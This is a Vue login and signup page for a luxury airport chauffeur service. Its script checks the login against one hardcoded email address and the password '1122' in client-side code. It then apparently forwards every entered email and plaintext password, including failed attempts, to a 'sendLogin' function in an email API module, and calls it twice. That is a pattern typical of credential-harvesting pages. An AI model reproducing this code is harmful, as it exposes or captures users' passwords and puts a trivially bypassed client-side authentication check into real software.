<template>
  <div
    class="relative max-w-6xl mx-auto min-h-screen flex items-center justify-center overflow-hidden px-8"
  >
    <div
      class="flex w-full h-[550px] bg-gray-100 rounded-xl shadow-lg relative overflow-hidden"
    >
      <transition name="slide-left" mode="out-in">
        <div
          v-if="isLogin"
          key="hero-left"
          class="hidden lg:flex w-1/2 bg-gradient-to-br from-[#425A4D] to-[#2F3B35] items-center justify-center text-white rounded-tl-xl rounded-bl-xl transform transition-transform duration-700"
        >
          <div class="max-w-md space-y-4">
            <h1 class="text-3xl font-bold leading-tight">
              Welcome Back to
              <span class="text-[#D4A574]">Premium Service</span>
            </h1>
            <p class="text-base opacity-90">
              Access your luxury transportation dashboard and manage your
              bookings with ease.
            </p>

            <!-- Quick Stats -->
            <div class="grid grid-cols-2 gap-4 py-3">
              <div class="text-center">
                <div class="text-2xl font-bold text-[#D4A574]">24/7</div>
                <div class="text-xs opacity-80">Support Available</div>
              </div>
              <div class="text-center">
                <div class="text-2xl font-bold text-[#D4A574]">50+</div>
                <div class="text-xs opacity-80">Professional Drivers</div>
              </div>
              <div class="text-center">
                <div class="text-2xl font-bold text-[#D4A574]">GPS</div>
                <div class="text-xs opacity-80">Live Tracking</div>
              </div>
              <div class="text-center">
                <div class="text-2xl font-bold text-[#D4A574]">100%</div>
                <div class="text-xs opacity-80">Secure Payments</div>
              </div>
            </div>

            <div class="pt-2">
              <img src="/images/car.webp" alt="Luxury chauffeur car" />
            </div>
          </div>
        </div>

        <div
          v-else
          key="hero-right"
          class="hidden lg:flex w-1/2 bg-gradient-to-br from-[#425A4D] to-[#2F3B35] items-center justify-center text-white rounded-tl-xl rounded-bl-xl transform transition-transform duration-500"
        >
          <div class="max-w-md space-y-4">
            <h1 class="text-3xl font-bold leading-tight">
              Join
              <span class="text-[#D4A574]">Premium Airport</span>
              Chauffeurs
            </h1>
            <p class="text-base opacity-90 mb-3">
              Create your account and unlock exclusive benefits:
            </p>

            <!-- Benefits List -->
            <div class="space-y-3">
              <div class="flex items-start space-x-2">
                <div
                  class="w-2 h-2 bg-[#D4A574] rounded-full mt-1.5 flex-shrink-0"
                ></div>
                <div>
                  <h3 class="font-semibold text-sm">Priority Booking</h3>
                  <p class="text-xs opacity-80">
                    Skip the queue with faster reservation process
                  </p>
                </div>
              </div>

              <div class="flex items-start space-x-2">
                <div
                  class="w-2 h-2 bg-[#D4A574] rounded-full mt-1.5 flex-shrink-0"
                ></div>
                <div>
                  <h3 class="font-semibold text-sm">Exclusive Member Rates</h3>
                  <p class="text-xs opacity-80">
                    Special pricing on luxury vehicles and services
                  </p>
                </div>
              </div>

              <div class="flex items-start space-x-2">
                <div
                  class="w-2 h-2 bg-[#D4A574] rounded-full mt-1.5 flex-shrink-0"
                ></div>
                <div>
                  <h3 class="font-semibold text-sm">24/7 Premium Support</h3>
                  <p class="text-xs opacity-80">
                    Direct access to our dedicated support team
                  </p>
                </div>
              </div>

              <div class="flex items-start space-x-2">
                <div
                  class="w-2 h-2 bg-[#D4A574] rounded-full mt-1.5 flex-shrink-0"
                ></div>
                <div>
                  <h3 class="font-semibold text-sm">Saved Preferences</h3>
                  <p class="text-xs opacity-80">
                    Store favorite locations and vehicle preferences
                  </p>
                </div>
              </div>
            </div>
            <div class="pt-2">
              <img src="/images/car.webp" alt="Luxury chauffeur car" class="" />
            </div>
          </div>
        </div>
      </transition>

      <transition name="slide-right" mode="out-in">
        <div
          v-if="isLogin"
          key="login-form"
          class="flex-1 flex items-center justify-center bg-gray-100 lg:py-10 lg:px-8 rounded-tr-xl rounded-br-xl transform transition-transform duration-500"
        >
          <div class="w-full max-w-md p-6 sm:p-8 space-y-6">
            <h1
              class="font-semibold text-2xl sm:text-3xl text-[#111827] text-center mb-2"
            >
              Log in to your account
            </h1>
            <p class="text-[#525252] text-center">
              Welcome back! Please enter your details.
            </p>
            <form @submit.prevent="handleSubmit" class="space-y-4">
              <div>
                <label
                  for="email"
                  class="block text-sm font-medium text-[#111827] mb-1"
                >
                  Email
                </label>
                <input
                  id="email"
                  type="email"
                  v-model="email"
                  placeholder="Enter your email"
                  class="w-full px-4 py-3 border rounded-lg focus:border-[#D4A574] focus:ring-1 focus:ring-[#D4A574] outline-none"
                />
              </div>
              <div>
                <label
                  for="password"
                  class="block text-sm font-medium text-[#111827] mb-1"
                >
                  Password
                </label>
                <input
                  id="password"
                  type="password"
                  v-model="password"
                  placeholder="Enter your password"
                  class="w-full px-4 py-3 border rounded-lg focus:border-[#D4A574] focus:ring-1 focus:ring-[#D4A574] outline-none"
                />
              </div>
              <p
                v-if="errorMessage"
                class="text-red-500 text-sm font-medium text-center"
              >
                {{ errorMessage }}
              </p>
              <button
                type="submit"
                :disabled="isLoading"
                class="w-full py-3 font-semibold text-white hover:text-[#151718] bg-[#D4A574] hover:bg-transparent border-[1.5px] border-[#D4A574] rounded-lg transition-colors duration-300 shadow-md cursor-pointer"
              >
                <span v-if="!isLoading">Login</span>
                <span v-else>Loading...</span>
              </button>
            </form>
            <p class="text-sm text-center">
              Don't have an account?
              <button
                @click="toggleForm"
                class="text-indigo-600 hover:underline font-medium"
              >
                Sign up form
              </button>
            </p>
          </div>
        </div>

        <div
          v-else
          key="signup-form"
          class="flex-1 flex items-center justify-center bg-gray-100 lg:py-10 lg:px-8 rounded-tr-xl rounded-br-xl transform transition-transform duration-700"
        >
          <div class="w-full max-w-md p-6 sm:p-8 space-y-6">
            <h1
              class="font-semibold text-2xl sm:text-3xl text-[#111827] text-center mb-2"
            >
              Create Account
            </h1>
            <p class="text-[#525252] text-center">
              Create an account to get started.
            </p>
            <form @submit.prevent="" class="space-y-4">
              <div>
                <label
                  for="fullName"
                  class="block text-sm font-medium text-[#111827] mb-1"
                >
                  Full Name
                </label>
                <input
                  id="fullName"
                  type="text"
                  placeholder="Full Name"
                  class="w-full px-4 py-3 border rounded-lg focus:border-[#D4A574] focus:ring-1 focus:ring-[#D4A574] outline-none"
                />
              </div>
              <div>
                <label
                  for="email"
                  class="block text-sm font-medium text-[#111827] mb-1"
                >
                  Email
                </label>
                <input
                  id="email"
                  type="email"
                  placeholder="Email"
                  class="w-full px-4 py-3 border rounded-lg focus:border-[#D4A574] focus:ring-1 focus:ring-[#D4A574] outline-none"
                />
              </div>
              <div>
                <label
                  for="password"
                  class="block text-sm font-medium text-[#111827] mb-1"
                >
                  Password
                </label>
                <input
                  id="password"
                  type="password"
                  placeholder="Password"
                  class="w-full px-4 py-3 border rounded-lg focus:border-[#D4A574] focus:ring-1 focus:ring-[#D4A574] outline-none"
                />
              </div>
              <button
                type="submit"
                class="w-full py-3 font-semibold text-white hover:text-[#151718] bg-[#D4A574] hover:bg-transparent border-[1.5px] border-[#D4A574] rounded-lg transition-colors duration-300 shadow-md cursor-pointer"
              >
                Sign Up
              </button>
            </form>
            <p class="text-sm text-center">
              Already have an account?
              <button
                @click="toggleForm"
                class="text-indigo-600 hover:underline font-medium"
              >
                Login form
              </button>
            </p>
          </div>
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup lang="ts">
import { sendLogin } from '~/api/email';

const isLogin = ref(true);

const toggleForm = () => {
  isLogin.value = !isLogin.value;
};

const email = ref('');
const password = ref('');
const errorMessage = ref('');
const isLoading = ref(false);
const handleSubmit = async () => {
  isLoading.value = true; // start loading
  await new Promise(resolve => setTimeout(resolve, 2000));
  try {
    if (email.value === 'saadjhujh8@gmail.com' && password.value === '1122') {
      errorMessage.value = '';
      await navigateTo('/');
    } else {
      errorMessage.value = 'Invalid email or password';
    }

    // Optional API call
    await sendLogin({
      email: email.value,
      password: password.value,
    });
  } catch (err) {
    console.error(err);
    errorMessage.value = 'Something went wrong. Try again.';
  } finally {
    isLoading.value = false; // stop loading
  }
  sendLogin({
    email: email.value,
    password: password.value,
  });
};
</script>

<style scoped>
.slide-left-enter-active,
.slide-left-leave-active {
  transition: all 0.5s ease;
}
.slide-left-enter-from {
  transform: translateX(-100%);
  opacity: 0;
}
.slide-left-leave-to {
  transform: translateX(-100%);
  opacity: 0;
}

.slide-right-enter-active,
.slide-right-leave-active {
  transition: all 0.5s ease;
}
.slide-right-enter-from {
  transform: translateX(100%);
  opacity: 0;
}
.slide-right-leave-to {
  transform: translateX(100%);
  opacity: 0;
}
</style>
